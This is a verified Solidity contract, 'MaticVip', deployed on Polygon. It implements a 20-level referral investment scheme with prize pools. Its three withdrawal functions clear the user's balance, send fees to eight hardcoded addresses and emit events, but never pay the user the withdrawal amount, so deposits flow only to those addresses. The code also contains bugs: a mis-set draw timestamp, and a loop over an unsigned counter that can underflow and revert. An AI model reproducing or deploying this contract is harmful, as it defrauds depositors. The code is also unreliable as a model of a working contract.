/**
 *Submitted for verification at polygonscan.com on 2021-12-20
*/

// pragma experimental ABIEncoderV2;
pragma solidity ^0.5.10;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract MaticVip{
    using SafeMath for uint256;
    uint256 constant public PERCENTS_DIVIDER = 1000;
    // TODO 2 hours
    uint256 constant public DURATION = 2 hours;
    // TODO  1 ether
    uint256 constant public UNIT = 1;
    uint256 public MIN_MILLET_AMOUNT = 1600 * UNIT;
    uint256 public MIN_MILLET_REWARD = 70 * UNIT;
    uint256 public totalChampionWeight;
    uint256 public totalMilletWeight;
    uint256 public milletPoolBalance;
    uint256 public milletLastDraw;
    uint256 public championPoolBalance;
    uint256 public championLastDraw;
    uint256[20] public ref_bonuses = [100, 40, 40, 40, 20, 20, 20, 20, 20, 20, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10];
    uint256[6] public defaultPackages = [100 * UNIT, 200 * UNIT, 400 * UNIT, 800 * UNIT, 1500 * UNIT, 2500 * UNIT];
    uint256[6] public withdrawReinvestRate = [400, 400, 350, 350, 300, 300];
    uint256[20] public requiredDirect = [100 * UNIT, 100 * UNIT, 100 * UNIT, 200 * UNIT, 200 * UNIT, 200 * UNIT, 400 * UNIT, 400 * UNIT, 400 * UNIT, 800 * UNIT, 800 * UNIT, 800 * UNIT, 1500 * UNIT, 1500 * UNIT, 1500 * UNIT, 2500 * UNIT, 2500 * UNIT, 2500 * UNIT, 2500 * UNIT, 2500 * UNIT];
    mapping(address => User) public users;
    address[] public championUsers;
    address[] public milletUsers;
    address[] public singleLeg;
    mapping(address => uint256 ) public milletUserIndexes;

    address payable[4] inventAddresses = [0x2222CC464d04c02aC2B11884559Ab515c346749D,0xE4Cfc7ef0bB6168f1a17D437888Dd7f097902b0F,0x69a521183bC701B7DABB9cc8d5a1b7701AE9576B,0xb51893DfE5ad5BbfCd2929BbbE81910fce9009e8];
    address payable[4] withdrawAddresses = [0x7B5FD2705809150C6781513054A3FC71a4Bfb5a8,0x1FBa0598de742D8F2C6fc06B9F13871Da7e8A00e,0xD9C55dd4A9B57982f27617c5213DA69a22B4346B,0xD79c164d6516aE829B1b9993262EFBa7E914c8d9];

    event Invest(address indexed user, uint256 amount);
    event ReInvest(address indexed user, uint256 amount);
    event Millet(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event ChampionWithdrawal(address indexed user, uint256 amount);
    event ChampionDraw(uint256 bonus, uint256 realBonus, uint256 num, uint256 weight);
    event ChampionLevelUpgrade(address indexed user, uint256 newLevel, uint256 oldLevel);
    event MilletWithdrawal(address indexed user, uint256 amount);
    event MilletDraw(uint256 bonus, uint256 realBonus, uint256 num, uint256 weight);

    struct User {
        uint256 singleLegPosition;
        uint256 amount;
        uint256 milletAmount;
        uint256 reInvestAmount;
        uint256 balance;
        uint256 championBalance;
        uint256 milletBalance;
        uint256 milletBonus;
        uint256 championLevel;
        address referrer;
        uint256 reserveBalance;
        uint256 teamAmount;
        uint256 directAmount;
        uint256 directNum;
    }

    function invest(address referrer) public payable {
        require(msg.value >= defaultPackages[0],'Min investment too low');

        User storage user = users[msg.sender];
        _setReferrer(user, referrer);

        if (user.amount == 0) {
            singleLeg.push(msg.sender);
            user.singleLegPosition = singleLeg.length;
        }

        user.amount = user.amount.add(msg.value);
        users[user.referrer].directAmount = users[user.referrer].directAmount.add(msg.value);
        _updateTeamInvest(msg.sender, msg.value);
        _updateUserChampionLevel(msg.sender);
        _updateUserChampionLevel(user.referrer);

        _invest(msg.sender ,msg.value, true);

        emit Invest(msg.sender, msg.value);
    }

    function _invest(address _addr, uint256 _amount, bool _is_static) private{

        _addInvestFee(msg.value);    
        _refPayout(_addr, _amount);
        if (_is_static == true) {
            _staticPayout(_addr, _amount);
            _addMilletBonus(getMilletBonus(_amount));
        } else {
            _addMilletBonus(getMilletBonus(_amount).add(getTotalStaticBonus(_amount)));
        }
        _addChampionBonus(getChampionBonus(_amount));

        if (milletLastDraw == 0) {
            milletLastDraw = block.timestamp;
        }

        if (championLastDraw == 0) {
            milletLastDraw = block.timestamp;
        }

        _championDraw();
        _milletDraw();
    }

    function _reinvest(address _addr, uint256 _amount, bool _is_static) private{
        User storage user = users[_addr];
        user.reInvestAmount = user.reInvestAmount.add(_amount);
        user.amount = user.amount.add(_amount);
        users[user.referrer].directAmount = users[user.referrer].directAmount.add(_amount);
        _updateTeamInvest(_addr, _amount);
        _updateUserChampionLevel(_addr);
        _updateUserChampionLevel(user.referrer);

        if (user.amount >= 800 * UNIT && user.reserveBalance > 0) {
            user.balance = user.balance.add(user.reserveBalance);
        }

        _invest(_addr, _amount, _is_static);

        emit ReInvest(_addr, _amount);
    }

    function millet(address referrer) public payable {
        require(msg.value == 1600 * UNIT || msg.value == 3200 * UNIT,'wrong amount');

        if (totalMilletWeight > 0) {
            require(getMilletDailyWeightReward() >= MIN_MILLET_REWARD,'Min reward is too low');
        }

        User storage user = users[msg.sender];

        if (user.milletAmount > 0) {
            (uint256 remain,) = getMilletMaxPayout(msg.sender);
            require(remain == 0,'Millet is not out');
        }

        _setReferrer(user, referrer);
        user.milletAmount = user.milletAmount.add(msg.value);
        totalMilletWeight = totalMilletWeight.add(getMilletWeightByAmount(msg.value));

        if (milletUserIndexes[msg.sender] == 0) {
            milletUsers.push(msg.sender);
            milletUserIndexes[msg.sender] = milletUsers.length;        
        }

        _invest(msg.sender ,msg.value, false);

        emit Millet(msg.sender, msg.value);
    }

    function withdrawal() external{
        User storage user = users[msg.sender];
        uint256 balance = user.balance;
        require(balance > 0, "balance not enough");
        user.balance = 0;

        balance = _subWithdrawFee(balance);

        (uint256 reinvestAmount, uint256 withdrawalAmount) = getEligibleWithdrawal(msg.sender, balance);

        if (reinvestAmount > 0) {
            _reinvest(msg.sender, reinvestAmount, true);
        }

        emit Withdrawal(msg.sender,withdrawalAmount);
    }

    function championWithdrawal() external{
        User storage user = users[msg.sender];
        uint256 balance = user.championBalance;
        require(balance > 0, "balance not enough");
        user.championBalance = 0;

        balance = _subWithdrawFee(balance);

        (uint256 reinvestAmount, uint256 withdrawalAmount) = getWithdrawReinvestAmount(balance);
        if (reinvestAmount > 0) {
            _reinvest(msg.sender, reinvestAmount, false);
        }

        emit ChampionWithdrawal(msg.sender, withdrawalAmount);
    }

    function milletWithdrawal() external{
        User storage user = users[msg.sender];
        uint256 balance = user.milletBalance;
        require(balance > 0, "balance not enough");
        user.milletBalance = 0;

        balance = _subWithdrawFee(balance);

        (uint256 reinvestAmount, uint256 withdrawalAmount) = getWithdrawReinvestAmount(balance);
        if (reinvestAmount > 0) {
            _reinvest(msg.sender, reinvestAmount, false);
        }
        emit MilletWithdrawal(msg.sender, withdrawalAmount);
    }

    function _subWithdrawFee(uint256 _balance) internal returns(uint256) {
        uint256 fee = getWithdrawFee(_balance);
        _sendFeeToAddr(fee);
        _balance = _balance.sub(fee);
        return _balance;
    }

    function _sendFeeToAddr(uint256 _fee) internal {
        if (withdrawAddresses.length > 0) {
            uint256 avgFee = _fee.div(withdrawAddresses.length);
            if (avgFee > 0) {
                for(uint256 i=0; i< withdrawAddresses.length; i++) {
                    _safeTransfer(withdrawAddresses[i], avgFee);
                }
            }
        }
    }

    function _addInvestFee(uint256 _amount) internal {
        if (inventAddresses.length > 0) {
            uint256 avgFee = _amount.mul(40).div(PERCENTS_DIVIDER).div(inventAddresses.length);

            if (avgFee > 0) {
                for(uint256 i=0; i< inventAddresses.length; i++) {
                    _safeTransfer(inventAddresses[i], avgFee);
                }
            }
        }
    }

    function _setReferrer(User storage _user, address _referrer) internal {
        if (_user.referrer == address(0)  && _referrer != msg.sender ) {
            _user.referrer = _referrer;
            users[_referrer].directNum++;
        }
        require(_user.referrer != address(0), "No upline");
        require(_user.referrer == _referrer, "Error upline");
    }

    function _updateTeamInvest(address _addr, uint256 _amount) private {

        address referrer = users[_addr].referrer;

        for (uint i=0 ; i< ref_bonuses.length;i++) {
            if (referrer == address(0)) break;
            users[referrer].teamAmount = users[referrer].teamAmount.add(_amount);
            referrer = users[referrer].referrer;
        }
    }

    function _updateUserChampionLevel(address _addr) internal {
        User storage _user = users[_addr];
        uint256 level = getChampionLevel(_user.amount, _user.directAmount);

        if (level > 0 && _user.championLevel < level) {
            uint256 oldLevel = _user.championLevel;
            _user.championLevel = level;

            uint256 weight = getChampionWeightByLevel(level).sub(getChampionWeightByLevel(oldLevel));
            totalChampionWeight = totalChampionWeight.add(weight);

            if (oldLevel == 0) {
                championUsers.push(_addr);
            }

            emit ChampionLevelUpgrade(_addr, _user.championLevel, oldLevel);
        }
    }

    function _addMilletBonus(uint256 _amount) internal {
        milletPoolBalance = milletPoolBalance.add(_amount);
    }

    function _addChampionBonus(uint256 _amount) internal {
        championPoolBalance = championPoolBalance.add(_amount);
    }

    function _refPayout(address _addr, uint256 _amount) internal {
        address up = users[_addr].referrer;
        uint256 totalRefBonus = getRefBonus(_amount);
        for(uint256 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].amount >= requiredDirect[i]){
                uint256 bonus = _amount.mul(ref_bonuses[i]).div(PERCENTS_DIVIDER);
                totalRefBonus = totalRefBonus.sub(bonus);

                users[up].balance = users[up].balance.add(bonus);
            }
            up = users[up].referrer;
        }

        if (totalRefBonus > 0) {
            _addMilletBonus(totalRefBonus);
        }
    }

    function _championDraw() internal {
        if (championLastDraw + DURATION <= block.timestamp) {

            uint256 balance = getChampionDailyReward();
            uint256 totalBonus = 0;

            if (balance > 0 && totalChampionWeight > 0) {
                for(uint i=0; i < championUsers.length; i++) {
                    uint256 weight = getChampionWeightByLevel(users[championUsers[i]].championLevel);
                    uint256 bonus =  balance.mul(weight).div(totalChampionWeight);
                    uint256 realBonus = getChampionBonusByLevel(users[championUsers[i]].championLevel, bonus);
                    if (realBonus > 0) {
                        users[championUsers[i]].championBalance =  users[championUsers[i]].championBalance.add(realBonus);
                        totalBonus = totalBonus.add(realBonus);
                    }
                }
            }

            championLastDraw = block.timestamp;
            emit ChampionDraw(balance, totalBonus, championUsers.length, totalChampionWeight);

        }
    }

    function _milletDraw() internal {
        if (milletLastDraw + DURATION <= block.timestamp) {

            uint256 balance = getMilletDailyReward();
            uint256 totalBonus = 0;

            if (balance > 0 && totalMilletWeight > 0) {

                for(uint i=0; i < milletUsers.length; i++) {
                    User storage user = users[milletUsers[i]];

                    if (user.milletAmount > 0) {
                        uint256 weight = getMilletWeightByAmount(user.milletAmount);
                        uint256 bonus =  balance.mul(weight).div(totalMilletWeight);
                        uint256 realBonus = getMilletBonusByAmount(user.milletAmount, bonus);
                        if (realBonus > 0) {
                            (uint256 remain,) = getMilletMaxPayout(milletUsers[i]);
                            if (realBonus >= remain) {
                                 _milletOut(milletUsers[i]);
                                realBonus = remain;
                            }

                            user.milletBalance =  user.milletBalance.add(realBonus);
                            user.milletBonus =  user.milletBonus.add(realBonus);
                            totalBonus = totalBonus.add(realBonus);
                        }
                    }
                }

                milletPoolBalance = milletPoolBalance.sub(totalBonus);
            
            }

            milletLastDraw = block.timestamp;
            emit MilletDraw(balance, totalBonus, milletUsers.length, totalMilletWeight);

        }
    }

    function _milletOut(address _addr) internal {
        User storage _user = users[_addr];
        uint256 weight = getMilletWeightByAmount(_user.milletAmount);

        _user.milletAmount = 0;
        _user.milletBonus = 0;
        if (weight < totalMilletWeight) {
            totalMilletWeight = totalMilletWeight.sub(weight);
        } else {
            totalMilletWeight = 0;
        }

    }

    function _staticPayout(address _addr, uint256 _amount) internal {
        User memory _user = users[_addr];    
        uint256 bonus = getStaticBonus(_amount);

        if (bonus > 0) {
            if (_user.singleLegPosition > 1) {
                uint256 upLegPosition = _user.singleLegPosition.sub(2);
                for (uint256 i = 0; i < 60; i++) {
                    if (singleLeg[upLegPosition] == address(0)) {
                        break;
                    }
                    _updateUplineUserStaticBonus(upLegPosition, _user.singleLegPosition, bonus);
                    if (upLegPosition == 0) {
                        break;
                    }
                    upLegPosition = upLegPosition.sub(1);
                }
            }
        
            if ( _user.singleLegPosition < singleLeg.length) {
                uint256 downLegPosition = _user.singleLegPosition;
                for (uint256 j = 0; j < 40; j++) {
                    if (downLegPosition >= singleLeg.length || singleLeg[downLegPosition] == address(0)) {
                        break;
                    }
                    _updateDownlineUserStaticBonus(downLegPosition, _user.singleLegPosition, bonus);
                    downLegPosition = downLegPosition.add(1);
                }
            }  
        }
    }

    function _updateUplineUserStaticBonus(uint256 _position, uint256 _max, uint256 _bonus) internal {
        User storage user = users[singleLeg[_position]];
        (,uint256 downlineCount) = getEligibleLevelCountForUpline(singleLeg[_position]);

        if (_position.add(downlineCount) > _max) {
            user.balance = user.balance.add(_bonus);
        } else {
            user.reserveBalance = user.reserveBalance.add(_bonus);
        }
    }

    function _updateDownlineUserStaticBonus(uint256 _position, uint256 _max, uint256 _bonus) internal {
        User storage user = users[singleLeg[_position]];
        (uint256 upLineCount,) = getEligibleLevelCountForUpline(singleLeg[_position]);

        if (_max.add(upLineCount) > _position) {
            user.balance = user.balance.add(_bonus);
        } else {
            user.reserveBalance = user.reserveBalance.add(_bonus);
        }
    }

    function getMilletMaxPayout(address _addr) public view returns(uint256, uint256) {
        User memory _user = users[_addr];
        uint256 max = _user.milletAmount.mul(1700).div(PERCENTS_DIVIDER);
        uint256 remain = 0;
        if (_user.milletBonus < max) {
            remain = max.sub(_user.milletBonus);
        } else {
            remain = 0;
        }
        return (remain, max);
    }

    function getStaticBonus(uint256 _amount) public pure returns(uint256) {
        return _amount.mul(4).div(PERCENTS_DIVIDER);
    }

    function getTotalStaticBonus(uint256 _amount) public pure returns(uint256) {
        return _amount.mul(400).div(PERCENTS_DIVIDER);
    }

    function getRefBonus(uint256 _amount) public pure returns(uint256) {
        return _amount.mul(440).div(PERCENTS_DIVIDER);
    }

    function getMilletBonus(uint256 _amount) public pure returns(uint256) {
        return _amount.mul(100).div(PERCENTS_DIVIDER);
    }

    function getChampionBonus(uint256 _amount) public pure returns(uint256) {
        return _amount.mul(20).div(PERCENTS_DIVIDER);
    }

    function getChampionDailyReward() public view returns(uint256) {
        return championPoolBalance.mul(150).div(PERCENTS_DIVIDER);
    }

    function getWithdrawReinvestAmount(uint256 _amount) public pure returns(uint256, uint256) {
        uint256 reinvestAmount =  _amount.mul(300).div(PERCENTS_DIVIDER);
        uint256 withdrawAmount = _amount.sub(reinvestAmount);
        return (reinvestAmount, withdrawAmount);
    }

    function getMilletDailyReward() public view returns(uint256) {
        return milletPoolBalance.mul(200).div(PERCENTS_DIVIDER);
    }

    function getMilletDailyWeightReward() public view returns(uint256) {
        if (totalMilletWeight > 0) {
            return getMilletDailyReward().div(totalMilletWeight);
        }
    }

    function getChampionWeightByLevel(uint256 _level) public pure returns(uint256) {
        if (_level == 1) {
            return 1;
        } else if (_level == 2) {
            return 2;
        }

        return 0;
    }

    function getChampionBonusByLevel(uint256 _level, uint256 _bonus) public pure returns(uint256) {
        if (_level == 1) {
            if (_bonus >= 70 * UNIT) {
                return 70 * UNIT;
            }
        } else if (_level == 2) {
            if (_bonus >= 140 * UNIT) {
                return 140 * UNIT;
            }
        } else if (_level == 0) {
            return 0;
        }

        return _bonus;
    }

    function getChampionLevel(uint256 _amount, uint256 _directAmount) public pure returns(uint256) {
        if (_amount >= 2500 * UNIT) {
            if (_directAmount >= 41300 * UNIT) {
                return 2;
            } else if (_directAmount >= 21300 * UNIT) {
                return 1;
            }
        }

        return 0;
    }

    function getMilletWeightByAmount(uint256 _amount) public pure returns(uint256) {
        if (_amount >= 3200 * UNIT) {
            return 2;
        } else if (_amount >= 1600 * UNIT) {
            return 1;
        }

        return 0;
    }

    function getMilletBonusByAmount(uint256 _amount, uint256 _bonus) public pure returns(uint256) {
        if (_amount >= 3200 * UNIT) {
            if (_bonus >= 180 * UNIT) {
                return 180 * UNIT;
            }
        } else if (_amount >= 1600 * UNIT) {
            if (_bonus >= 90 * UNIT) {
                return 90 * UNIT;
            }
        } else if (_amount == 0) {
            return 0;
        }

        return _bonus;
    }

    function getEligibleLevelCountForUpline(address _addr) public view returns (uint256 uplineCount, uint256 downlineCount){
        uint256 totalDeposit = users[_addr].amount;
        if (totalDeposit >= defaultPackages[3]) {
            uplineCount = 40;
            downlineCount = 60;
        }else if (totalDeposit >= defaultPackages[2]) {
            uplineCount = 25;
            downlineCount = 45;
        }else if (totalDeposit >= defaultPackages[1]) {
            uplineCount = 20;
            downlineCount = 40;
        }else if(totalDeposit >= defaultPackages[0]) {
            uplineCount = 15;
            downlineCount = 35;
        }else{
            uplineCount = 0;
            downlineCount = 0;
        }
        return (uplineCount, downlineCount);
    }

    function getEligibleWithdrawal(address _addr, uint256 _amount) public view returns(uint256, uint256){
        User memory user = users[_addr];

        uint256 reinvestAmount = 0;
        uint256 withdrawalAmount = 0;

        for (uint i=5; i>=0; i--) {
            if (user.amount >= defaultPackages[i]) {
                reinvestAmount  = _amount.mul(withdrawReinvestRate[i]).div(PERCENTS_DIVIDER);
                withdrawalAmount  = _amount.sub(reinvestAmount);
                break;
            }
        }

        return (reinvestAmount, withdrawalAmount);
    }

    function getWithdrawFee(uint256 _amount) public pure returns(uint256) {
        return _amount.mul(40).div(PERCENTS_DIVIDER);
    }

    function getContractInfo() public view returns(uint256, uint256, uint256 ,uint256) {
        return (championPoolBalance, totalChampionWeight, milletPoolBalance, totalMilletWeight);
    }

    function _safeTransfer(address payable _to, uint256 _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
        _to.transfer(amount);
    }

}